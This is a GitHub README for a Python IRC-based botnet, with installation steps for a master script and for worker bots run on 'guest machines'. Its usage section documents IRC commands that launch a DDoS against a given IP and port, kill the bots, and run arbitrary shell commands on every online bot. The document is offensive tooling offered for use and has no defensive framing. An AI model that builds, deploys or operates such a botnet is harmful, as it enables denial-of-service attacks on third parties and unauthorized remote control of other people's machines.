# IRC Botnet

## Description

A simple IRC based botnet written in Python that allows one to run commands on all the online bots.

### Dependencies

Install the requirements:

  ```sh
  pip install -r requirements.txt
  ```

### Installing

1. Clone the repo to your server via git:

```sh
git clone https://github.com/FarazFe/irc-botnet.git
```

2. Register two IRC accounts for admin and bot master.
   follow <a href="https://help.ubuntu.com/community/InternetRelayChat/Registration">this guide</a> for more information
3. Register a channel for the botnet to join.
   follow <a href="https://meta.wikimedia.org/wiki/IRC/Instructions#New_channel_setup">this guide</a> for more
   information
4. Update the config.py to match your personal info.
5. Run bot_master.py on host machine by executing:

    ```sh
   python bot_master.py
   ```
   You need bot_master.py and config.py files on the host machine.
6. Run bot_worker.py on each guest machine by installing the requirements and executing:
    ```sh
    python bot_worker.py
    ```
   You need bot_worker.py and config.py and commands.py on the guest machine.

### Examples

First, log in to your channel with admin username from an IRC client of your choice.

1- To start a DDOS attack, type in the following manner:

```sh
!ddos <ip>:<port> -n <number_of_exectuions> -w <number_of_workers>
```

e.g:

```sh
!ddos 127.0.0.1:8000 -n 1000 -w 5
```

This command starts DDOSing 127.0.0.1 on port 8000 with 5 workers, each attacking 1000 times.

2- To kill the bots, type:

```sh
!die -w 1 -n 1
```

3- Arbitrary commands could be run this way:

```sh
!mkdir ./custom_dir -n 1 -w 1
```

## License

This project is licensed under the MIT License - see the LICENSE.md file for details

## Acknowledgments

* [irc](https://github.com/jaraco/irc)